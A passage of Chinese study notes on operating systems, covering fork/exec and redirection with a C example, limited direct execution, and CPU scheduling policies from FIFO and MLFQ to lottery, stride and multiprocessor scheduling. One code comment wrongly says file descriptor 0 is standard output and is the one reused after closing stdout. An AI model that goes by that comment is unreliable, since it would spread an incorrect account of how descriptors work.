<h3 id="exec-系统调用"><a href="#exec-系统调用" class="headerlink" title="exec() 系统调用"></a>exec() 系统调用</h3><p>fork 让子进程完全拷贝父进程的代码，exec 则可以让新进程运行和原进程完全不一样的东西，并且它并不是通过创建新进程来实现，而是直接在内存中，用被调用的新程序的数据覆盖旧进程的一切数据；如果在 exec() 之后，旧程序还有一部分代码还没有执行的话，则那部分代码就再也没有机会执行了；</p>
<h3 id="为什么这么设计进程-API-？"><a href="#为什么这么设计进程-API-？" class="headerlink" title="为什么这么设计进程  API ？"></a>为什么这么设计进程  API ？</h3><p>fork 负责创建子进程，exec 负责用新进程覆盖当前进程，这意味着如果两者配合起来使用，可以实现在运行新进程里面，先跑一段子进程的代码，干一点想干的其他事情；整个过程是先创建新的子进程（复制父进程代码），再覆盖该子进程（用其他新代码），其中最大的重点是在覆盖之前做的相关事情，不会影响到父进程，却又能在覆盖之前，引用父进程的环境和代码，做一些准备工作；</p>
<p>上面的这种工作方式，很适合 shell 想要实现的功能，即在 shell 中调用程序（通过 fork 创建新进程，然后 exec 新程序，并且父进程调用 wait 等待子进程的返回）；</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 重定向的实现原理：shell 在 fork 出子进程后，将子进程的标准输出重定向到 newfile 文件；然后用 exec 调用 wc，接下来 wc 的输出就会进入到文件中了</span></span><br><span class="line">&gt; <span class="built_in">wc</span> pc.c &gt; newfile.txt</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="comment">// 重定向的实现</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> rc = fork();</span><br><span class="line">	<span class="keyword">if</span> (rc &lt; <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;fork failed\n&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (rc == <span class="number">0</span>) &#123;</span><br><span class="line">         <span class="comment">// 可用的文件描述符是从 0 开始计数的，当创建一个进程时，0 一般绑定到标准输出；</span></span><br><span class="line">         <span class="comment">// 通过关闭标准输出，将使得 0 描述符回到可用的状态；</span></span><br><span class="line">         <span class="comment">// 当使用 open 命令打开一个新文件时，它会寻找最小的可用描述符，此时刚好就是 0，因此新文件被绑定到了 0；</span></span><br><span class="line">         <span class="comment">// 完成绑定后，接下来程序中的所有输出，都会被写入文件中；</span></span><br><span class="line">		close(STDOUT_FILENO);</span><br><span class="line">		open(<span class="string">&quot;./p4.output&quot;</span>, O_CREAT|O_WRONLY|O_TRUNC, S_IRWXU);</span><br><span class="line"></span><br><span class="line">		<span class="comment">// now exec &quot;wc&quot;...</span></span><br><span class="line">		<span class="type">char</span> *myargs[<span class="number">3</span>];</span><br><span class="line">		myargs[<span class="number">0</span>] = strdup(<span class="string">&quot;wc&quot;</span>);</span><br><span class="line">		myargs[<span class="number">1</span>] = strdup(<span class="string">&quot;p3.c&quot;</span>);</span><br><span class="line">		myargs[<span class="number">2</span>] = <span class="literal">NULL</span>;</span><br><span class="line">		execvp(myargs[<span class="number">0</span>], myargs);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// wait 会返回子进程的 pid；如果当前进程没有子进程，则会返回 -1，表示调用错误；</span></span><br><span class="line">		<span class="type">int</span> wc = wait(<span class="literal">NULL</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p> UNIX shell 中的管道功能也是使用这种方式来实现的；前一个程序的输出，被重定向到管道队列中，然后将下一个程序的输入也重定向到管道队列中，这样就可以实现将上一个程序的输出，无缝的作为下一个程序的输入；其背后使用了 pipe 系统调用；</p>
</blockquote>
<h3 id="其他-API"><a href="#其他-API" class="headerlink" title="其他 API"></a>其他 API</h3><p>关于如果与进程交互，UNIX 中有一系列丰富的工具，常见的包括：</p>
<ul>
<li>ps，查看当前正在运行的进程；</li>
<li>top，当前各进程的资源占用情况；</li>
<li>kill，给某个进程发送终止的信号；</li>
</ul>
<h2 id="4-机制：受限直接执行"><a href="#4-机制：受限直接执行" class="headerlink" title="4. 机制：受限直接执行"></a>4. 机制：受限直接执行</h2><p>待解决问题：执行程序的时候，不可避免需要将 CPU 运行指令的权力交给程序，但是却要实现两方面的目标，一是交出 CPU 之后，能够再收回来，避免程序永久性占用；二是程序使用 CPU 执行指令的范围应该受到限制，避免程序访问任意资源；最后，在不同的时间将不同的 CPU 交付给不同的程序使用，不可避免要在程序间切换，因此还需要考虑如何减少切换带来的开销，提高性能；</p>
<h3 id="基本技巧：受限直接执行"><a href="#基本技巧：受限直接执行" class="headerlink" title="基本技巧：受限直接执行"></a>基本技巧：受限直接执行</h3><p>操作系统执行程序的过程：</p>
<ul>
<li>OS：在进程列表中新增一个条目；</li>
<li>OS：为程序分配内存；</li>
<li>OS：将程序加载到内存中；</li>
<li>OS：根据 argc&#x2F;argv 初始化程序的栈；</li>
<li>OS：清除寄存器</li>
<li>OS：将 main 函数的起始地址放入寄存器，以便从该处开始执行指令；</li>
<li>程序：执行 main 函数下的指令</li>
<li>程序：从 main 函数中返回；</li>
<li>OS：释放进程的内存；</li>
<li>OS：将进程从进程列表中删除；</li>
</ul>
<h3 id="问题1：受限制的操作"><a href="#问题1：受限制的操作" class="headerlink" title="问题1：受限制的操作"></a>问题1：受限制的操作</h3><p>程序在执行过程中，不可避免需要使用到一些 I&#x2F;O 操作，为了避免恶意的程序滥用这些操作，在执行指令时，现代操作系统通过提供用户模式和内核模式两种状态，来区别于程序发起的普通操作和受限操作；</p>
<p>当程序开始执行时，默认是运行在用户模式下的；当程序想执行一些受限制的操作时，需要遵守操作系统的约定，调用操作系统提前写好的函数（即系统调用），并将参数传递给该函数去执行；操作系统的函数会执行在内核模式下，它可以执行任意类型的操作，访问任意类型的资源；当然，也可以对程序想要实现的操作先进行一番审核，确保该操作是有权限的，才继续往下，不然可以直接驳回；</p>
<p>每个函数背后其实是一条或多条的指令；当程序按约定执行操作系统提供的函数时，其实就是在执行这些指令；在这些指令中，有一条 trap 指令，当 CPU 执行到该条指令时，会将当前程序的运行模式，从用户模式切换为内核模式，并将下一条指令的地址，修改到操作系统在虚拟内存空间中的指令的对应地址，这样 CPU 接下来就开始执行操作系统自己在开机后，预先加载到内存中的那些指令；</p>
<blockquote>
<p>问：程序能否实现不执行 trap 指令，却实现对用户模式的更改？</p>
<p>答：由于程序被 OS 加载到内存后，一开始默认运行在用户模式下，在此模式下，程序想去修改模式状态的值，应该会被 CPU 拒绝；</p>
<p>问：好奇这个状态值存在哪里？是否存在某个寄存器里面？</p>
<p>答：所有硬件，在 OS 刚启动时，OS 会准备好一份表格，上面备注当出现某个异常时，需要调用的异常处理的指令地址，并把该地址写入硬件的存储器中；当出现某种异常时，硬件根据存储器中记录的地址，从该地址加载指令，开始执行；此时的硬件相当于被写死了，包括 CPU 也是；当程序尝试调用硬件处理某类事情时，硬件只会按写好的地址处取指令来执行，而不会执行程序给出的指令；如果程序尝试非法访问某些资源时，CPU 会报错，例如段错误；</p>
</blockquote>
<p>完善后的 OS 执行程序的流程：</p>
<ul>
<li>OS：初始化陷阱表，指定当出现某种类型的异常时，需要调用哪些指令来处理；</li>
<li>OS：将异常处理指令的地址告知 CPU；</li>
<li>CPU：记住异常处理指令的地址；</li>
<li>OS：在进程表上添加新条目、为程序分配内存、加载程序到内存中、根据 argv 初始化程序栈、初始化内核栈、从陷阱返回；</li>
<li>CPU：从内核栈恢复寄存器、切换为用户模式、根据寄存器地址跳转到 main 入口指令；</li>
<li>程序：执行 main、调用系统调用、触发陷阱、陷入 OS（将控制权移交给 OS）；</li>
<li>CPU：将寄存器保存到内核栈（因为后续要为应用程序恢复寄存器状态）、切换为内核模式、跳转到陷阱处理指令；</li>
<li>OS：执行陷阱处理指令、完成系统调用的工作任务、从陷阱返回；</li>
<li>CPU：从内核栈恢复寄存器、切换为用户模式、跳转到陷阱之后的指令地址；</li>
<li>程序：继续执行余下指令、从 main 中返回、调用 exit 系统调用，触发陷阱，陷入 OS；</li>
<li>CPU：将寄存器保存到内核栈、切换为内核模式、跳转到陷阱处理指令；</li>
<li>OS：释放进程的内存、将进程从进程列表中删除；</li>
</ul>
<blockquote>
<p>CPU 的寄存器是供不同的程序轮流使用的，因此如果想要调用另外一个函数 B 做某种运算，其逻辑是当前函数 A 将函数 B 所需要的参数先保存到约定的寄存器中，然后跳转到 B 函数的指令入口地址，开始执行 B 函数；函数 B 的指令会自行到约定的寄存器处查找所需要的参数；</p>
</blockquote>
<h3 id="问题2：在进程间切换"><a href="#问题2：在进程间切换" class="headerlink" title="问题2：在进程间切换"></a>问题2：在进程间切换</h3><p>问：由于 CPU 是供不同程序轮流使用的，而操作系统本质上也不外乎是另外一个大一点的程序，当 CPU 在执行其他程序的指令时，操作系统如何将控制权拿回来呢？</p>
<h4 id="协作模式"><a href="#协作模式" class="headerlink" title="协作模式"></a>协作模式</h4><p>早期的方案是让程序每隔一段时间做一次系统调用，这个系统调用其实啥事也不作，唯一实现的效果是将控制权切换回给操作系统；但这种模式有个漏洞，即程序本身要遵守约定才，如果程序是一个恶意程序，操作系统就被架空了；当然，为了防止程序权力不受限制，在该模式下，如果程序尝试做一下非法的动作时，例如访问本不应该访问的内存，或者计算以 0 的除法，则会触发异常，导致控制权转回给 OS，接下来 OS 可能会将程序杀死；</p>
<h4 id="非协作模式"><a href="#非协作模式" class="headerlink" title="非协作模式"></a>非协作模式</h4><p>显然依赖每个程序都会善意的交回控制权是很危险的，因此需要有另外一种机制保证无论如何 CPU 都可以取得控制权；解决办法就是在 CPU 内置一个时钟中断的功能，它会按照提前设置好的时间值，每隔一段时间就触发一次中断异常，然后执行 OS 的异常指令，这样就将 CPU 的执行权交回给 OS 了；除了将异常处理地址写入 CPU 外，启用 CPU 的时间中断功能，也是操作系统在启动时的必做功课之一，这样它才拥有 CPU 控制权的安全保证；</p>
<blockquote>
<p>CPU 在触发中断时，需要将当前程序的各种寄存器状态保存下来，以便中断结束后，能够从当前程序的中断继续执行；</p>
</blockquote>
<h4 id="保存和恢复上下文"><a href="#保存和恢复上下文" class="headerlink" title="保存和恢复上下文"></a>保存和恢复上下文</h4><p>当中断时钟触发中断异常后，CPU 控制权交加给 OS，OS 需要决定接下来运行哪个程序；如果是要切换到其他程序，OS 需要负责保存当前程序的上下文（保存到进程结构中），以便将来再回来执行该程序时，能够从中断处继续；</p>
<h3 id="问题3：并发"><a href="#问题3：并发" class="headerlink" title="问题3：并发"></a>问题3：并发</h3><p>当 OS 在处理某个系统调用时，有可能此时发生了一个中断，因此操作系统现在相当于有两个任务要处理了；如何解决并发的问题，不同的操作系统有不同的策略；既可以单纯的禁止和拒绝（代价是当前任务处理过久的话，有可能丢失未处理的那个任务），也可以是引入锁的机制，并发处理（代价是复杂度大大提高）；</p>
<blockquote>
<p>当一个 OS 运行的时间越久，由于各种意料之外的情况的存在，它有可能会慢慢累积越来越多的错误，导致出现一些莫明其妙的问题；因此，定期对 OS 进行重启是一种有益的做法；它可以让操作系统恢复到一个初始状态，这个状态得到了更加充分的测试，存在更少的不确定性；</p>
</blockquote>
<h2 id="5-进程调度：介绍"><a href="#5-进程调度：介绍" class="headerlink" title="5. 进程调度：介绍"></a>5. 进程调度：介绍</h2><p>当有多个进程在同时运行的时候，不可避免会出现调度的工作，因此需要制定一个调度的策略，以尽可能提高机器的运行效率；</p>
<h3 id="工作负载假设"><a href="#工作负载假设" class="headerlink" title="工作负载假设"></a>工作负载假设</h3><p>为了判断不同调度策略的效率，先从做一些最简单和简化的基本假设，来作为讨论的起始点，这些基本假设包括：</p>
<ul>
<li>所有任务同时到达 CPU</li>
<li>每个任务运行相同的时间</li>
<li>一旦开始某个任务，就一直运行到任务完毕再退出，中间不切换；</li>
<li>所有的工作只涉及 CPU ，不使用其他 I&#x2F;O 设备</li>
<li>CPU 已经提前知道每个工作需要运行多少时间；</li>
</ul>
<h3 id="调度指标"><a href="#调度指标" class="headerlink" title="调度指标"></a>调度指标</h3><p>为了比较不同调度策略的好坏，还需要设计一个指标，以便将调度策略的效率进行量化；此处假设使用周转时间作为指标</p>
<p>任务周转时间 &#x3D; 完成时间 - 到达时间；</p>
<blockquote>
<p>此处的到达时间指任务到达 CPU 的时间（可以先假设为零，即假设所有任务同一时间到达 CPU，供 CPU 进行调度）</p>
</blockquote>
<h3 id="先进先出策略-FIFO"><a href="#先进先出策略-FIFO" class="headerlink" title="先进先出策略 FIFO"></a>先进先出策略 FIFO</h3><p>先进先出策略（First In First Out）的思想很简单，就是先到达的先处理，等处理完了再处理下一个；后到达的先等待；</p>
<p>它的优点是策略的实现很容易很简单；</p>
<p>它的缺点是有可能会增加平均周转时间，因为有可能先到达的任务是一个非常耗时的任务，而后面的任务是小任务，结果导致大量的小任务被迫等待很久以后才能得到处理；</p>
<h3 id="最短任务优先策略-SJF"><a href="#最短任务优先策略-SJF" class="headerlink" title="最短任务优先策略 SJF"></a>最短任务优先策略 SJF</h3><p>如果任务同时到达，那么最短任务优先（Shortest Job First）是最优的策略，它可以让平均周转时间最低；但现实的问题是任务常常不会同时到达，这就导致如果先到达的任务是一个大任务，即后续到达的小任务仍然需要被迫等待大任务先执行完成，导致平均周转时间相对先进先出并没有什么变化；</p>
<h3 id="最短完成时间优先策略-STCF"><a href="#最短完成时间优先策略-STCF" class="headerlink" title="最短完成时间优先策略 STCF"></a>最短完成时间优先策略 STCF</h3><p>最短完成时间优先（Shortest Time-to-Completion First）的思想是，当有多个任务到达 CPU 时，即使 CPU 当前已经在处理某个任务，CPU 仍然会比较一下所有这些任务（包括处理中的）的剩余工作时间，最少的那个优先处理；</p>
<blockquote>
<p>但这个策略有一个问题，即 CPU 需要提前知道任务的剩余完成时间，但显然这也是不太可能的；</p>
</blockquote>
<h3 id="新度量指标：响应时间"><a href="#新度量指标：响应时间" class="headerlink" title="新度量指标：响应时间"></a>新度量指标：响应时间</h3><p>前面的三个策略都是针对周转时间这个指标来设计的，这在早期的批处理系统是有意义的。在那个年代，开发人员提前将 CPU 要做的工作先准备好，然后一次性的送入 CPU 执行，然后开发人员静静等待结果即可；</p>
<p>但是 PC 后来进入了个人消费者的时代，用户体验也变得越来越重要，因此，响应时间变成了更重要的指标，而不再是周转时间；由于 CPU 处理能力越来越快，分时系统的引入，让 CPU 能够同时处理多个程序；</p>
<h3 id="轮转策略-RR"><a href="#轮转策略-RR" class="headerlink" title="轮转策略 RR"></a>轮转策略 RR</h3><p>轮转策略（Round-Robin）的思想，就是将程序的运行时间划分时间中断周期的倍数时间，然后 CPU 在多个任务之间不停的轮转执行，直到某个任务结束退出轮转队列为止；</p>
<p>虽然时间片是中断周期的倍数，但是它并不是越短越好，因为 CPU 切换进程是需要成本的，因此在响应时间和切换时间之间，需要采取一个折中平衡的点；</p>
<h3 id="结合-I-O"><a href="#结合-I-O" class="headerlink" title="结合 I&#x2F;O"></a>结合 I&#x2F;O</h3><p>轮转策略并没有从总体上降低所有任务的总完成时间，甚至相反，它基本上都大大延长了周转时间，但是它提高了响应时间，让用户体验更好，减少了等待的感觉；但是当任务需要调用 I&#x2F;O 时，轮转策略的周转时间会有所降低；</p>
<h3 id="无法预知"><a href="#无法预知" class="headerlink" title="无法预知"></a>无法预知</h3><p>一般来说，操作系统对进程任务需要多少时间才能完成并不了解的，因此前面提出的策略都不好使，因为它们都要求操作系统有未卜先知的能力；</p>
<h2 id="6-调度：多级反馈队列"><a href="#6-调度：多级反馈队列" class="headerlink" title="6.调度：多级反馈队列"></a>6.调度：多级反馈队列</h2><p>现代操作系统使用的是多级反馈队列策略（MLFQ：Multi-Level Feedback Queue）的调度方法，这个方法最早是在 1962 年的时候提出来的；它的目标是兼顾响应时间和周转时间；</p>
<h3 id="基本规则"><a href="#基本规则" class="headerlink" title="基本规则"></a>基本规则</h3><p>MLFQ 的基本思想是维护多个不同优先级的队列，每次都优先执行高优先级队列中的任务；如果同一个队列中有多个任务，则在这些任务之间使用轮转策略；一个任务在某个时刻只能处于一个队列中；</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20200920082636.png"></p>
<p>接下来的核心是，MLFQ 设计了一套规则，用来观察任务接下来的表现，如果根据规则，某个任务被判断为是一个交互为主的任务（例如频繁放弃 CPU 占用，等待用户的键盘输入），则将调高任务的优先级（即把它从低优先的队列中拉出来，放到高优先级的队列中去）；</p>
<p>在任务刚到达时，系统并不知道它是何种类型的任务，因此默认先将其设为最高优先，如果它短时间内不能完成，则不断降低它的优先级；</p>
<ul>
<li>规则1：如果 A 的优先级大于 B，运行 A；</li>
<li>规则2：如果 A 的优先级等于 B，轮转运行 A 和 B；</li>
</ul>
<h3 id="尝试1：如何改变优先级"><a href="#尝试1：如何改变优先级" class="headerlink" title="尝试1：如何改变优先级"></a>尝试1：如何改变优先级</h3><ul>
<li>规则3：任务到达时，先将它放在最高优先级的队列；</li>
<li>规则4a：如果任务完整用完分配给它的第一个时间片的话，降低一个优先级（放入另一个队列中）；</li>
<li>规则4b：如果任务在用完时间之前主动释放 CPU，则优先级保持不变；</li>
</ul>
<blockquote>
<p>截止目前的规则，只会降低优先级的动作，还没有调高优先级的动作，但是一个任务可能在不同的时间阶段，其表现形式不同，比如一开始是计算密集型的，之后变成了交互密集型的；目前的规则会导致该任务在后期的交互响应很慢，甚至直接饿死了；</p>
<p>另外还要防止一些任务出现欺诈，即它本质上是计算密集型的任务，即故意在时间片快结束前主动释放 CPU ，从而维持其优先级不变，糊弄调度程序；</p>
</blockquote>
<h3 id="尝试2：提升优先级"><a href="#尝试2：提升优先级" class="headerlink" title="尝试2：提升优先级"></a>尝试2：提升优先级</h3><p>为了避免综合型任务（前期计算密集型，后期交互密集型）被饿死，需要定期关照一下它们，因此引入规则5；</p>
<ul>
<li>规则5：每经过一段时间 S，就把系统中所有任务重新加入到最高优先级的队列；</li>
</ul>
<blockquote>
<p>这个规则引入了一个新问题，即 S 的大小如何设置的问题；如果 S 设置得太大，则任务仍然有可能饿死；如果设置得太小，则交互型任务的响应时间变慢；</p>
</blockquote>
<h3 id="尝试3：更好的计时方式"><a href="#尝试3：更好的计时方式" class="headerlink" title="尝试3：更好的计时方式"></a>尝试3：更好的计时方式</h3><p>为了避免被一些恶意任务糊弄，调度策略需要改进原来的规则4，从原本的单次计时制，改变为累计时制，即累计该任务在当前队列已经用了多少时间，而不再像原来一样，如果任务主动释放 CPU，就会重新计时；现在不重新计时了，而是不管有无主动释放，或者释放多少次，只计算该任务在当前优先级的队列中，已经占用和消耗了多少分配给它的 CPU 时间；如果该累计时间已经达到配额的上限，就将它的优先级调低；</p>
<ul>
<li>规则4（改进版）：如果任务用完了其在某个优先级队列中的时间配额，就将它降低一个优先级（不管它中间是否主动释放 CPU，以及释放了多少次）；</li>
</ul>
<h3 id="MLFQ-调优及其他问题"><a href="#MLFQ-调优及其他问题" class="headerlink" title="MLFQ 调优及其他问题"></a>MLFQ 调优及其他问题</h3><p>为了更好的提高性能，大多数 MLFQ 的实现都支持给不同的优先级队列设置不同的时间配额，整体原则是优先级越高的队列，时间配额越小，单次执行时间越短，即切换也频繁；而优先级越低的队列，时间配置越大（单次执行时间越久）；</p>
<p>至于每种优先级的具体时间配额应该是多少，以及多长时间提升一次所有任务的优先级，不同的 MLFQ 实现有不同的做法；有些是使用配置表，有些是使用数学公式算法；</p>
<blockquote>
<p>有些操作系统有内置的调度策略，但站在用户的层面，该默认策略并一定是用户在运行某个进程时最想要的效果，因此，操作系统一般会提高一些接口，供用户或系统管理员进行调用，用来告知操作系统一些建议，以便操作系统可以基于这些建议，做出更好的调度安排；</p>
</blockquote>
<h2 id="7-调度：比例份额"><a href="#7-调度：比例份额" class="headerlink" title="7.调度：比例份额"></a>7.调度：比例份额</h2><p>之前的调度策略目标是最小化响应时间和周转时间；但是如果换成另外一个目标，即保证每个任务都可以分配到一定比例的 CPU 时间，则会衍生另外一种类型的调度算法：比例份额调度策略；</p>
<p>比例份额策略有一些非常简单的实现思路，即彩票制；即让每个进程拥有一定数量的彩票，然后从彩票池中随机抽奖，抽出哪个号码，就运行拥有该彩票号码的进程；如果某个进程的优先级比例高，则就给它分配多一点的彩票，这样它就被抽中的概率就是提高；反之则是下降；</p>
<h3 id="基本概念：彩票数表示份额"><a href="#基本概念：彩票数表示份额" class="headerlink" title="基本概念：彩票数表示份额"></a>基本概念：彩票数表示份额</h3><p>彩票制的最大亮点是引入了随机性，虽然随机性在短时间内并不能保证概率符合预期，但是只要足够长的时间，就可以无限接近预期；但是随机性最大的好处在于它可以避免出现传统人工算法可能出现的无法覆盖的极端边角情况；</p>
<p>另外一个好处是随机算法实现起来很容易，没有很多复杂的中间状态值需要记录；因此，它运行起来也更快；</p>
<blockquote>
<p>虚拟机的内存分配管理也经常使用彩票制来实现；</p>
</blockquote>
<h3 id="彩票机制"><a href="#彩票机制" class="headerlink" title="彩票机制"></a>彩票机制</h3><p>在原始的彩票调度策略下，为了让操作系统能够更加灵活的应对各种使用场景，额外引入了一些配套的机制来改进原始彩票机制，例如：</p>
<ul>
<li>用户内部的二次分配：假设用户 A 获得系统分配的100 张彩票，而它内部有两个任务要执行，它可以给这两个任务再做一次分配；</li>
<li>彩票转让机制：一个进程可以临时的将自己的彩票转给另外一个进程，以促进另外一个进程更快的执行；</li>
</ul>
<h3 id="实现思路"><a href="#实现思路" class="headerlink" title="实现思路"></a>实现思路</h3><p>彩票调度策略实现思路很简单，仅需要一个随机数生成器、一个链表，一个进程结构（保存进程号和它拥有的彩票数）；</p>
<p>当随机数生成出来后，开始遍历链表，判断当前的彩票数，加上之前已经遍历完的彩票数，看是否会大于出奖号码，如果大于，则当前链表节点即是中奖的进程；</p>
<blockquote>
<p>为了让遍历更加有效率，最好能够将链表按彩票数从大到小进行排列，这样有助于更快找到中奖号码；</p>
</blockquote>
<p>由于彩票算法存在随机性，这意味着当任务的执行时间很短时，彩票算法的分配效率比较糟糕，即并不是公平分配的，而是随机性很大；只有当任务的执行时间很长，需要很多个时间片时，在分配上面就会越发的公平；</p>
<h3 id="如何分配彩票"><a href="#如何分配彩票" class="headerlink" title="如何分配彩票"></a>如何分配彩票</h3><p>如何分配彩票这个问题，就彩票机制本身来说，并没有提供任何答案。因为操作系统对于即将要运行的进程是未知的，所以自然也不知道应该分配多少彩票给该进程才算是合理的；</p>
<h3 id="步长调度策略"><a href="#步长调度策略" class="headerlink" title="步长调度策略"></a>步长调度策略</h3><p>由于彩票制的随机性，在小样本数时表现不好，因此通过引入步长的概念来减少这种随机性；它的基本思路是先用一个统一的大数，来除各个进程的彩票数，这样就得到该进程如果想要积累到该大数，需要走多少步；例如假设大数是 10000，则拥有 200 张彩票的步长  &#x3D; 10000 &#x2F; 200 &#x3D; 50 个步长；</p>
<p>步长调度策略是每走一步，就累加记录当前任务的累计步长；在下一轮分配的时候，优先考虑分配给累计步长数最小的进程；</p>
<blockquote>
<p>虽然步长调度去除了随机性，但是其实现比彩票调度稍微复杂一点点，因为需要引入全局状态，记录每个任务的累计步长是多少；另外步长调度仍然也还没是没有解决彩票调度存在的问题，即初始化状态下，应该给一个任务分配多少彩票；</p>
</blockquote>
<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>彩票调度和步长调度并没有在操作系统中得到广泛的采用，其原因即在于未解决初始状态如何分配彩票的问题，但是它们在一些特殊场景中可以使用，例如虚拟机的实现；因为在这些场景中，初始状态分配多少彩票，由用户给出了答案；</p>
<h2 id="8-多处理器的调度"><a href="#8-多处理器的调度" class="headerlink" title="8.多处理器的调度"></a>8.多处理器的调度</h2><p>多处理器出现的原因在硬件条件方面的限制，即某个时间点，硬件设计人员无法在不增加太多功耗的情况下，当单核 CPU 实现更快的速度，因此通过在一块芯片上放置多个 CPU 来实现曲线救国；但这也给操作系统和应用程序引入了新的挑战，即如何有效利用多核心的处理器来实现效率的提升；</p>
<h3 id="背景：多处理器架构"><a href="#背景：多处理器架构" class="headerlink" title="背景：多处理器架构"></a>背景：多处理器架构</h3><p>由于 CPU 寄存器的速度远远大于内存，因此在二者之间引入了一层高速缓存，来缓解速度差异过大导致的性能瓶颈；但单 CPU 的情况下，这个机制将很好的工作；但是当引入多个 CPU 内核，而这些内核又共享相同的高速缓存时，问题将变得微妙了起来，因为有可能 A 核的缓存被 B 核改动，导致 A 核再次访问缓存中的数据时，已经不存在了，A 核不得不再次到内存中读取。这个即是所谓的缓存一致性问题（持久性存储的场景也会面临缓存一致性问题，凡是使用缓存提高存储效率的场景，估计都不可避免会面临这个问题）；</p>
<h3 id="同步问题"><a href="#同步问题" class="headerlink" title="同步问题"></a>同步问题</h3><p>在引入了多 CPU 后，如果一段修改某个数据的代码，被分配到多个 CPU 上并发执行，将带来灾难性的问题，最终的计算数据常常跟预期的不同。这时需要引入互斥锁来保证数据更新操作的原子性才行；</p>
<h3 id="缓存亲和度"><a href="#缓存亲和度" class="headerlink" title="缓存亲和度"></a>缓存亲和度</h3><p>某个进程交付给某个 CPU 内核执行后，在该 CPU 的寄存器中将维持很多状态，记录着存储在高速缓存中的数据。此时如果将进程切换交给另外一个 CPU 内核执行，由于新的 CPU 内核的寄存器并不知道原先高速缓存中保存的那些状态数据，因此不得不重新到内存中加载；因此，操作系统在调度进程的时候，最好考虑缓存亲和性，将进程仍交付之前的  CPU 进行处理；</p>
<blockquote>
<p>如果多核 CPU 共享一份地址转换表的话，或许可以解决这个问题？</p>
</blockquote>
<h3 id="单队列调度"><a href="#单队列调度" class="headerlink" title="单队列调度"></a>单队列调度</h3><p>单队列多处理器调度（SQMS：Single Queue Multiprocessor Scheduling）实现起来比较简单，基本复用原来单处理器的调度策略即可，即将所有需要调度的工作，放入一个队列中，当某个 CPU 出现空闲时，就到队列中取走一个任务进行处理；但它的缺点有两个：</p>
<ul>
<li>为了避免多个 CPU 修改同一份数据，需要给数据加锁，但是加锁会带来性能损失；</li>
<li>进程可能在不同的 CPU 之间切换，导致失去了缓存亲和性；</li>
</ul>
<h3 id="多队列调度"><a href="#多队列调度" class="headerlink" title="多队列调度"></a>多队列调度</h3><p>多队列多处理器调度（MQMS：Multi-Queue Multiprocessor Scheduling）让每个 CPU 专享一个自己的队列；当一个任务进来后，操作系统根据一定的规则（如随机挑选或者挑选短的队列）将任务放到某个 CPU 的队列中，接下来就跟单处理器的流程一样了；</p>
<p>MQMS 的好处是可以保证亲和性，也无须担心进程在 CPU 之间切换带来的性能开销；但它的缺点是有可能造成资源闲置。即某个 CPU 接到一个大任务导致很忙，而其他 CPU 都是一些小任务，很闲，即所谓的负载不均问题；</p>
<p>负载不均的一个解决办法是定期干预的思路，即当某个 CPU 队列开始变闲时，就将较忙的队列上面的任务迁移一个到较闲的队列中；</p>
<blockquote>
<p>这种技术称为“工作窃取”，即闲置的 CPU 每隔一段时间就到繁忙的 CPU 那里窃取一个任务过来；但隔多久去窃取一次是个微妙的设定，因为时间太短太频繁的话，会带来较大的切换性能开销；如果时长太长的话，有可能导致负载不均；</p>
</blockquote>
<h3 id="Linux-的多处理器调度"><a href="#Linux-的多处理器调度" class="headerlink" title="Linux 的多处理器调度"></a>Linux 的多处理器调度</h3><p>Linux 社区就使用何种调度程序没有达成共识，共有三种常用方案：</p>
<ul>
<li>O(1)：多队列，基于优先级调度，类似 MLFQ；</li>
<li>CFS：多队列，基于比例调度，类似步长调度；</li>
<li>BFS：单队列，基于比例调度，采用 EEVEF 算法（最早最合适虚拟截止时间优先算法）；</li>
</ul>
<h2 id="9-抽象：地址空间"><a href="#9-抽象：地址空间" class="headerlink" title="9.抽象：地址空间"></a>9.抽象：地址空间</h2><h3 id="早期系统"><a href="#早期系统" class="headerlink" title="早期系统"></a>早期系统</h3><p>最早的时候，操作系统没有提供任何内存方面的抽象，内存的头部存储着操作系统的系统（当时 OS 还在库时代），然后从某个地址之后存着程序的代码，内存中也只有一个程序，没有其他程序；</p>
